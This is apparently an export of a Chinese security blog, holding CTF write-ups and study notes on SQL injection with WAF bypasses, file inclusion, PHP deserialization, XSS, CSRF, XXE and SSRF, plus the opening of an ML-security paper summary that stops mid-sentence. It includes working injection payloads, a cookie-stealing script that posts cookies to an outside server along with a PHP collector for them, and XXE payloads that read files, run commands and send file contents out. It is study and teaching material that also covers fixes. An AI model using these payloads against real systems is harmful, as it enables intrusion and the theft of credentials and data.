    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/2009 拿到题目，先尝试分析，在框内输入1，网页显示you are in... 接着在框内输入0，网页显示you are not in... 接着尝试输入0' or '1'='1，网页反馈信息Sql injection detected!，由此可以知道该数据库存在WAF保护，通过burp跑fuzz测试，如下图所示： 可知可以用的符号是or,=,(,),',&quot; 被屏蔽的符号为and,,,substring,union,#,|另外空格添加在字符中间也会被屏蔽 因此可以看出本体的解题思路是使用布尔盲注。。 我们首先用%0a代替空格进行注入，命令为id=1'%0aor%0a'1'='1，结果为you are not in... 这说明用%0a代替空格的方案是正确的，但是可能or在处理中被删除了，因此用oorr来代替or进行注入，结果显示成功，由此开始布尔注入的过程。 接下来的过程中，我们用oorr替换or，并且把空格替换成%0a 获取数据库名称长度和数据库名称 构造payload获取名称长度： 0' or (length(database())=%s) or'0 构造获取名称的payload: 0' or (mid(database() from %s for 1))='%s' or '0 爆破的结果如下图所示： 可知获取到的数据库名称为ctf_sql_bool_blind 获取表名的长度和名称 构造payload获取长度： 0' or (length((select group_concat(table_name separator '@') from information_schema.TABLES where TABLE_SCHEMA=database()))=%s) or'0 获取名称的payload为： 0' or (mid((select group_concat(table_name separator '@') from information_schema.TABLES where TABLE_SCHEMA=database())from %s for 1)='%s')or '0 爆破结果如下： 由上图可知，该数据库下由两张表，分别是fiag和users，因为在最开始没有在group_concat里面加separator ‘@’，所以两个名称都连在一起了，原因是默认的分隔符不知道是什么，所以程序就跳过了分隔符。 获取字段名称长度和名称 构造获取长度的payload: 0' or (length((select group_concat(column_name) from information_schema.columns where TABLE_name='%s'))=%s) or'0 获取内容的payload: 0' or (mid((select group_concat(column_name) from information_schema.columns where TABLE_name='%s')from %s for 1)='%s')or '0 爆破结果如下： 获取flag的长度和内容 获取长度的payload: 0' or (length((select %s from %s))=%s) or'0 获取内容的payload: 0' or (mid((select %s from %s)from %s for 1)='%s')or '0 爆破结果如下： 这里多加了两位长度，因为在提交的时候发现爆破出来的flag一直报错，多加了两位后发现后面无论多少位-都能匹配上，因此认定中间的-可能是另外的符号转化的。 通过使用ascii()函数来确定该字符的确切ascii码，发现该字符是空格，因为空格已经被屏蔽了，所以用等号来确定是无法确定的。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF题目-加了料的报错注入]]></title>
    <url>%2F2019%2F07%2F04%2FCTF%E9%A2%98%E7%9B%AE-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[题目地址：http://www.shiyanbar.com/ctf/2011 尝试 首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。 进入网页解题，源码部分给出了查询数据库的命令，为 $sql=&quot;select * from users where username='$username' and password='$password'&quot;; 同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为username=1+&amp;+password=1，发送后网页端返回Login failed 尝试使用username=' or 1=1 %23&amp;password=1进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF 测试 使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同 首先对于username，分析结果如下图所示： 由返回长度可以知道信息，其中302是Login failed，238是Sql injection detected，235是username unknow error对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml 对于password，分析结果如下： 和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句 构造语句username=' or exp/*&amp;password=*/(~(select * from (select user()) a)) or '发现返回的语句并没有解析user()，而是原样报错返回了 尝试使用updatexml构造语句username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or '，可以发现网页返回了用户名web8@localhost 破解 得到payload就可以开始注入了，首先构造一句话来得到表名字： username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or ' 结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为： username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or ' 网页返回结果为XPATH syntax error: ':ffll44jj,users' 因此成功得到表名为ffll44jj 接下来尝试获取字段名，同样的方法，构造语句： username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp 'ffll44jj')),1) or ' 网页成功返回XPATH syntax error: ':value' 由此得知flag所在列的名称为value 再次构造命令来获取列中的值： username=' or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or ' 然后就可以成功得到flag为XPATH syntax error: ':flag{err0r_b4sed_sqli_+_hpf}']]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入的总结和小技巧]]></title>
    <url>%2F2019%2F07%2F02%2FSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93%E5%92%8C%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[一些常用指令 1.当前数据库的所有表 select group_concat(table_name separator '@') from information_schema.TABLES where TABLE_SCHEMA=database(); 2.获取表中的所有列的名字 select group_concat(column_name separator '@') from information_schema.columns where table_name='表名' 布尔注入 通常情况下可以使用mid和substring两个函数来进行布尔注入，哪个能用就使用哪个，另外在盲注的情况下可以使用ascii()来逐一判断表名列名等 (ascii(subtring(database(),1,1))=104 (ascii(mid(database(),1,1))=104 但是WAF屏蔽了逗号的使用，那么两种函数都是用不了了，这时候可以换一种表述方式来进行注入，语句如下所示： (ascii(substring(database() from 2))=111) (mid(database() from 1 for 1))='a' (substring(database() from 1 for 1))='a' 另外如果需要用到if语句，也可以将逻辑换一种表达方式，可以使用case when xxx then xxx else xxx end的逻辑，其具体语法如下所示 123456SELECT &lt;myColumnSpec&gt; = CASE WHEN &lt;A&gt; THEN &lt;somethingA&gt; WHEN &lt;B&gt; THEN &lt;somethingB&gt; ELSE &lt;somethingE&gt; END 举一个爆数据库名的例子： 1' and case when (substring((select database()) from 1 for 1)='w') then sleep(3) else sleep(0) end and '1'='1 select屏蔽绕过、 1,：转换个别字母大小写 2：输入SESELECTLECT之类的语句来代替SELECT 3：用转义的URL编码来代替SELECT（不知道这么表述对不对，就是%后面跟上16进制的ascii码……） 4：用/**/来隔开SELECT中的各个字母 PHP一些特性（漏洞） 弱类型比较：在某些情况下，PHP会把类数值数据（如含有数字的字符串等）转换成数值处理，== 运算符就是其中之一。在使用 == 运算符对两个字符串进行松散比较时，PHP会把类数值的字符串转换为数值进行比较，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。比如: 3 == '3ascasd’结果为true。 以0为开头的MD5值 只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabg7XSs，aabC9RqS PHP布尔类型 bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。 截断问题 ereg函数漏洞：00截断 SHA1和MD5函数 这两个PHP函数因为不能处理数组，所以在传入数组的时候会发生错误，在PHP中会直接返回一个False，因此在比较两者的hash值是否相等时，可以传入两个数组，因为false=false成立 jother编码 如果在网页中出现一堆+!的东西就用jother解码 在console将那堆解码的东西复制过去 按回车即可解码 设置伪造的IP地址 在包头添加Client-IP:可以用来伪造当前客户端的IP地址，从而欺骗服务器 Mysql的用户名和密码 Mysql中可以直接使用username和password获取当前的用户名和密码（不知道对不对）]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件包含的简单介绍]]></title>
    <url>%2F2019%2F07%2F02%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[文件包含 文件包含漏洞 服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。下面是PHP文件包含的几种函数： 1234567require()require_once()include()include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 漏洞产生原理 文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 示例代码： 1234&lt;?php $filename = $_GET['filename']; include($filename);?&gt; 如果攻击者在filename中输入想要获取的路径和文件名，那么可以很轻松取得。 截断包含 如果在服务器的php代码中已经添加好了后缀文件类型，而GET所传输的仅仅是文件名而已，此时如果想要获得服务器内任意类型的文件，则需要使用截断，截断在前面提到过，输入想要的文件后加入一个空字节，由于php本身的漏洞，仅会解释空子节前的内容。 这个漏洞仅在magic_quotes_gpc = Off php版本&lt;5.3.4的条件下有用 PHP协议包含 PHP协议类似于ftp协议，用于输入输出数据 比如$file_in = file_get_contents(&quot;php://input&quot;); 要开启PHP协议必须在配置文件中设置 allow_url_include&amp;&amp;allow_url_fopen=On 而且发送的信息需要通过POST协议提交，举个例子： 在URL中在网站附加信息?f=php://input 并在POST中输入想要发送的信息 远程文件包含 PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。 通过远程文件包含漏洞，包含php.txt可以解析。 http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt 文件包含漏洞的修补 1.过滤./. 2.白名单验证（只能包含当前目录下的php文件） 3.最好不要让客户端控制文件包含目录的地址 另一种文件包含的方式 可以利用Apache的日志系统来实现文件包含，在URL数据传入的字段注入PHP代码，然后再访问日志文件从而执行之前注入的代码 一个函数 $_GET['a']($_GET['b']) 可以通过传入两个值来分别代表命令和传入的值 PHP命令执行的几个函数 exec() system() popen() passthru() proc_open() pcntl_exec() shell_exec() 反引号实际上是使用shell_exec()函数 反序列化 序列化就是通过serialize()函数来将一个数组转换成字符串，从而可以输出数组的内容 反序列化就是将字符串转化成数组，通过unserialize()来实现 在研究反序列化漏洞的时候，碰见这几个魔法函数就要仔细研究研究了： 123456789__construct()当一个对象创建时被调用__destruct()当一个对象销毁时被调用__toString()当一个对象被当作一个字符串使用__sleep() 在对象在被序列化之前运行__wakeup将在序列化之后立即被调用 举个例子，以一道CTF题目为例子 123456789&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x-&gt;readfile();?&gt; 123456789101112131415&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作 直接构造序列化对象传过去O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;} 就行了]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击]]></title>
    <url>%2F2019%2F06%2F30%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[JS和AJAX的一些基础 1.window.onload()指的是等网页的元素都加载完毕就会执行这段代码 如果存在两个onload，那么只会执行后一个 12window.onload = function() &#123; alert(“text1”);&#125;; window.onload = function() &#123; alert(“text2”);&#125;; 2.onreadystatechange 事件：当请求被发送到服务器时，我们需要执行一些基于响应的任务。每当 readyState 改变时，就会触发 onreadystatechange 事件。下面是一个实例： 1234567xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.getElementById("myDiv").innerHTML=xmlhttp.responseText; &#125;&#125; Ajax跨域 正常的跨域实现方案 1.允许单个域名访问 若需要指定某域名(http://client.runoob.com)跨域访问，只需要在(http://server.runoob.com/server.php)文件的头部添加如下代码： header('Access-Control-Allow-Origin:http://client.runoob.com'); 2.允许多个域名访问 在头部文件中添加如下代码： 12345$origin = isset($_SERVER['HTTP_ORIGIN'])? $_SERVER['HTTP_ORIGIN'] : ''; $allow_origin = array( 'http://client1.runoob.com', 'http://client2.runoob.com' ); if(in_array($origin, $allow_origin))&#123; header('Access-Control-Allow-Origin:'.$origin); &#125; 3.允许所有域名访问 在头部添加如下代码： header('Access-Control-Allow-Origin:*'); 利用其他方法实现跨域 1.在HTML中对跨域网站请求一些内容，例如图片，JS代码等信息，在请求网站后添加？以及需要传递的信息，从而实现信息的跨域传输。例如 &lt;img src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt; &lt;script src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt;&lt;/script&gt; 存储XSS 存储XSS，会把攻击者的数据存储到服务器端，攻击行为将伴随着攻击数据一直存在。 一个存储xss攻击的例子，在内容行输入JS脚本，因为JS脚本一般比较长的原因，将src指向其他地方的一个JS文件 下面是该JS文件的源码，可以看到JS脚本通过获取当前网页的cookie并发送到其他服务器来实现窃取Cookie的操作： 123456789101112131415161718192021function xlx()&#123; if(window.navigator.userAgent.indexOf('MSIE')&gt;0)&#123; return new ActiveXObject("Microsoft.XMLHTTP"); &#125;else&#123; return new XMLHttpRequest(); &#125;&#125;var xd = xlx();var data = 'c='+document.cookie;var url = 'http://rushrush.com/demo.php';xd.open('post',url);xd.setRequestHeader('content-type','application/x-www-form-urlencoded');xd.onreadystatechange=function()&#123; if(xd.readyState == 4 &amp;&amp; xd.status == 200)&#123; // document.write(xd.responseText); &#125;&#125;xd.send(data); 另外远端服务器的PHP代码作用是将传输过来的Cookie值存储到本地服务器，这样整个盗取的过程就完整了 12345678910&lt;?phpheader('Access-Control-Allow-Origin:*');$c = empty($_REQUEST['c'])?"":$_REQUEST['c']."\r\n";echo 'hello '.$c;$myfile = fopen("d:/1.txt","a+");fwrite($myfile,$c);fclose($myfile);?&gt; 反射型XSS 和存储型CSS不同的是，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。下面是一个攻击的例子： 一下网页在用户键入一个用户名后，会反馈出Hello+用户名 如果在键入的用户名区域输入跨站脚本，则可以和上面的存储型XSS一样，获取到用户的Cookie信息，从而实现攻击，如下图的输入信息就能成功实现攻击 进行反射型XSS的时候，第三者通常会经注入了脚本信息的链接发给用户，用户通过打开该链接被获取Cookie，从而第三方利用获取的Cookie登陆。 DOM型XSS 不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。 下面是一个利用DOM-XSS进行攻击的例子： DOM型XSS 在浏览器执行DOM型XSS的时候，由于浏览器的X-XSS-Protection策略，会返回错误信息，并执行失败，如下图所示： 该策略可以通过CRLF绕过，利用的前提是我们能够控制一段参数，也就是POST或者GET的数据，而且这个数据会用在返回包的包头中。通过CRLF注入在返回包头中注入一个X-XSS-Protection:0从而使得浏览器关闭策略拦截，但是该漏洞现在已经很难利用了，因为最新版本的PHP不允许在HTTP表头内出现换行字符(要利用的话PHP版本必须低于5.1)… 另外PHP中执行header(&quot;Location: $a&quot;)可在返回的包头中添加跳转的一行，想要增加其他的包头也同理。 CRLF注入 修补XSS漏洞 1.做处理（过滤） 可以通过将&gt;和&lt;删除，或者将这两种符号替换成去其他的符号代替 2.转义 可以将JS语句转换成HTML实体，可以在PHP中使用htmlentities()语句 闭合XSS代码 一般在PHP代码中会增加&lt;textarea&gt;&lt;/textarea&gt;区域，在该区域中用了JS代码会变成普通的文本而无法执行，因此在注入文本的时候会先增加&lt;/textarea&gt;把前面的区域给闭合掉，然后再添加JS脚本的代码 CSRF攻击 CSRF攻击和跨站脚本攻击有点类似，他可以通过给用户发送一个链接，然后在该链接中加入某个恶意的脚本，从而利用用户的登陆信息执行某些行为，比如说如下情况： 如果存在一个链接http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012 这个链接的作用是让博主删除编号为126713012的博客。 攻击者首先在自己的域中构造一个页面： http://www.a.com/csrf.html 其内容为： &lt;img src='http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012' /&gt; 博客主通过点击进入攻击者构造的域，会看见一张失效的图片，回头却发现自己的博客被删除了。 目前防御CSRF攻击主要有三种策略：验证HTTP Refer字段；在请求地址中添加token并验证；在HTTP头中自定义属性并验证 XSS蠕虫 如果访问一个网站http://www.a.com/1.js会使得用户在某论坛发表一条评论，这条评论也就是&lt;script src=http://www.a.com/1.js&gt;&lt;/script&gt;。这样会使得这个评论迅速扩散开来，每一个看过这个网页的人都会传播这条评论。 XXE攻击 XXE实际上就是XML的一个实体注入 XML在外部实体的写法如下： 123456DTD 实例:&lt;!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"&gt;&lt;!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd"&gt;XML example:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt; XXE的危害有几种：可以ssrf，读文件和执行命令，扫描端口 可用外部实体读文件，假若一个包的内容为： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "http://www.a.com/demo.php"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 该包的目的是通过外部访问http://www.a.com/demo.php这个网站，然后将访问返回的值赋给&amp;xs 另外可以让服务器使用ftp协议取读取某个地址中的一个文件内容，如果要读取PHP文件，则需要使用PHP协议，例如： 12345678910111213&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "file:///D:/1.txt"&gt;// &lt;?ENTITY xs SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.php"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 还可以通过外部访问来扫描某IP的端口，如： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "127.0.0.1：1080"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 通过判断返回包的信息来判断该端口是否是开放的 对于执行命令的用法，如下代码所示： 123456789101112&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY xs SYSTEM "expect://id"&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xs;&lt;/name&gt;&lt;text&gt;222&lt;/text&gt;&lt;/root&gt; 利用外部实体访问来进行攻击的案例如下： 首先攻击者发送一份包含xml实体内容的包给服务器，包的内容如下 12345678&lt;?xml version='1.0' encoding='utf-8'?&gt;&lt;!DOCTYPE bbb[ &lt;?ENTITY %xs SYSTEM "www.a.com/a.dtd"&gt; %xs;]&gt;&lt;root&gt;&amp;xd2;&lt;/root&gt; 下面是a.dtd的内容相当于读取服务器内的一个文件1.txt，并将其发送到了www.a.com域名中： 123&lt;IENTITY %xd SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.txt"&gt;&lt;IENTITY %demo "&lt;IENTITY xd2 SYSTEM "http://www.a.com/xs.php?i=%xd"&gt;"&gt;%demo; XXE漏洞修补 1.使用开发语言提供的”禁用外部实体的方法“ PHP：libxml_disable_entity_loader(true); JAVA: 12DocumentBuliderFactory dbf = DocumentBuliderFactory.nerInstance();dbf.setExpandEntityReferences(false); Python: 12from lxml import extreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 2.过滤用户提交的XML数据关键词：&lt;!DOCTYPE和!ENTITY，或者SYSTEM和PUBLUC SSRF SSRF是一种由攻击者构造形成的，由服务器端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（相当于服务器接受客户端所提供的URL，然后服务器代客户端去请求该URL，返回数据给客户端） 用途：扫描端口，读取文件 假如服务器端的PHP文件如下： 123456789&lt;?php$url = empty($_GET['url'])?"":$_GET['url'];if($url!="")&#123; $html = file_get_contents($url,true); echo $html;&#125;else&#123; echo 1;&#125;?&gt; 在请求网站过程中，发送一个网站地址，服务器就会带客户端返回该网站的内容，如果该网站是服务器的内部网站，那么该方式就成功获取了内部网站的内容。并且还能通过服务器扫描内部网下其他服务器的开放端口。 为了避免SSRF攻击，转发的内容尽量在客户端执行，比如说从其他网站请求一张图片显示，服务器端应该返回代码&lt;img src=www.xxx.com/ff.jpg /&gt;，如果是服务器自己先获取到图片再进行转发，则很容易被利用。 探测是否有SSRF漏洞的一种方法，在传入网址端传入ip.cn，若发现IP地址和本机不一样，则说明存在漏洞。]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入总结]]></title>
    <url>%2F2019%2F06%2F27%2FSQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Mysql的一些基本操作命令 创建数据库：create database XXX; 查看数据库：show databases; 切换数据库：use XXX; 删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not null,sex char(10) not null,addr char(20) not null); 查看数据表：show tables 插入数据表：insert into teacher(name,sex,addr) values('leo','male','hangzhou'); 查询数据表：select * from teacher; 查看表的结构：desc XX; 更新数据：update teacher set name=&quot;X&quot; where id=X; 删除数据：delete from teacher where name=&quot;X&quot;; order by用于排序：select information from table order by X ASC/DESC; union可以用来连接两个信息，即增加一项select LIMIT用法：SELECT * FROM table LIMIT offset, rows 第一个数字指的是起始行，第二数字指的是获取的行数！ 一些常用的数据库查询命令 1.当前数据库的所有表 select table_name from information_schema.TABLES where TABLE_SCHEMA=database(); 2.获取表中的所有列的名字 select column_name from information_schema.columns where table_name='表名' 判断时字符串注入还是整型注入 1.当加单引号进行闭合后，会报错或者无内容显示： select * from table where id=3’ 2.当不用单引号闭合，并且在后面加条件会按照条件的逻辑顺序显示，则判断为整型注入 select * from table where id=3 and 1=1 不满足以上两点就时字符串注入，其特征有以下几点： 1.当用单引号闭合后还是会报错，因为闭合后单引号个数不匹配： select * from table where name=’admin’’ 2.需要对后面的内容进行注释，注释符号为-- (后面有个空格) # 延时注入 延时注入主要用于不显示错误信息的情况下对数据库名字，表的名字，列的名字进行显示的一种方法。 if(ascii(subtring(&quot;hello&quot;,1,1))=104,sleep(5),0); 可以看到，取出&quot;hello&quot;里的第一个字符串，也就是&quot;h&quot;,判断他的ascii码是否为104(&quot;h&quot;的ascii码为104),如果是则延时5秒，反之不延时。同样，我们可以在substring函数里面写SQL语句，提取出我们所要查的表名、列名，再用延时猜解出来。 联合注入 首先可以通过order by来试探出总共有多少个字段 http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 order by 1 还可以通过union select查看当前数据库的某些表 http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 union select 1,database(),3 LIMIT 1,1 不过这种情况不适合用于盲注的场景，因为没有输出反馈 别名 在查询数据库的时候可以给列的名字取一个别名，以下两张图为示例： 下图中用了’as’作为别名显示的字符 其中‘as’可写可不写 Mysql之bug注入 利用数据库的BUG进行利用，看输出的报错信息，因为报错的信息中包含了我们想要获取的信息。 只要是count(),rand,group by三个连用就会造成BUG报错（一般表中的数据需要三条以上），如下代码 select concat(floor(rand(0)*2),(select database())) as x,count(1) from student group by x; 就会在报错中显示数据库的名字！ Mysql注入之函数报错 有许多函数可以利用，如updatexml, exp, geometrycollection, polygon, multipoint, multilinestring, multipolygon 通过UpdateXml报错，注入语句如下： &amp; 1=(updatexml(1,concat(0x3a,(select user())),1)) 通过exp报错，注入的语句如下： &amp; exp(~(select * from (select user()) a)) 通过GeometryCollection()报错，注入语句如下： &amp; geometrycollection((select * from(select * from(select user())a)b)) 后两句会因为版本问题失效。。。 Mysql注入的修补 对于字符串的修补，在PHP程序中，用addslashes()函数，将符号包括用来闭合的单引号转义，即在符号前面加一个‘\’ 对于int型的数据，可以在获取过程中对其加0，若输入是字符串则会自动转型成int，避免了注入的威胁。因为若输入一个字符串，在转型过程中只会保留第一个数字字符而舍去后面的字符。 还可以通过搜索输入字符串中是否存在像“select”&quot;from&quot;等的关键词，将关键词转型，则可以实现注入修补 宽字节注入 在前面可以看到，通过用转义来实现对Mysql的修补，然而通过利用宽字节可以实现恢复单引号闭合。 大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 [宽字符注入详解](https://blog.csdn.net/helloc0de/article/details/76180190 “宽字符”) insert,update,delete注入 三者的区别在于其注入的那句程序是insert,update还是delete 三者都支持报错注入 insert注入 一个insert注入的例子： 1.确认是否存在注入 2.获取数据库名： or updatexml('',concat(0x7e,(SELECT DATABASE())),0x7e) or 3.获取表名： or updatexml('',concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 2,1)),0x7e) 4.获取字段名： or updatexml('',concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='users' limit 0,1)),0x7e) 5.获取数据 or updatexml('',concat(0x7e,(SELECT concat_ws(':',user_id,first_name,last_name) FROM users limit 0,1)),0x7e) 如果是inset一般要增加右括号，因为根据insert的语句，闭合括号再对口面部分进行注释可以实现注入。 delete注入 delete注入部分支持布尔注入和延时注入和报错注入 延时注入的一个语句范例： delete from users where user_id=1 and sleep(if(database()='dvwa',5,1)); 经过上述语句可以用来确定一些信息，而且不会执行delete，即不会删除数据库中的条目 update注入 update同理只是将操作数据库的命令变成了update，下面是一个例子： update teacher set name=&quot;Gou&quot; where id=1 and sleep(if(database()='test',5,1)); Mysql注入经常用到的函数 1.HEX()函数，能够将字符或者数字转成十六进制 2.ASCII()函数和ORD()，将字符转成对应ASCII表上的数字，区别在于ord能进行多字节的字符处理 3.char()函数，能从数字还原出对应的ASCII码 Mysql注入常用函数]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习安全论文阅读笔记]]></title>
    <url>%2F2018%2F11%2F14%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%AE%89%E5%85%A8%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Hacking Smart Machines with Smarter Ones: How to Extract Meaningful Data from Machine Learning Classifiers 论文地址：https://arxiv.org/abs/1306.4447 基本思路 本文介绍了一种从机器学习分类器中提取有用信息的方法。一般分类器会有意无意泄露一些有用的信息，可以通过训练一个元分类器来入侵其他分类器来获得一些关于训练集的有用信息。有时候发布一个训练好的分类器其实是有信息泄露的威胁。首先，经销商的分类器算法时公开的，而且经销商在销售过程中攻击者必定能得到分类器的副本。攻击者由此可以通过基于动态二进制的分析技术来提取分类器 该论文的主要工作有三点： 1.提出了一种新类型的信息泄露概念，并且这种观点以前从未提到过，表明可以从一个训练好的分类器中提取有价值的信息。 2.提出了一种可以利用上述漏洞泄露来破解机器学习分类器的攻击方法，在该方法中，利用了一个元分类器模型，它可以从目标分类器中提取一些有价值的信息。 3.描述了几种成功攻破机器学习分类器的例子：基于隐式马尔科夫链的语音识别系统、基于支持向量机的互联网流量交换分类器。 攻击过程的思路：定义了一个数据集DDD，其中它所包含的元素形式为(a,l)∣a=ha1,a2,...,ani){(a,l)|a = 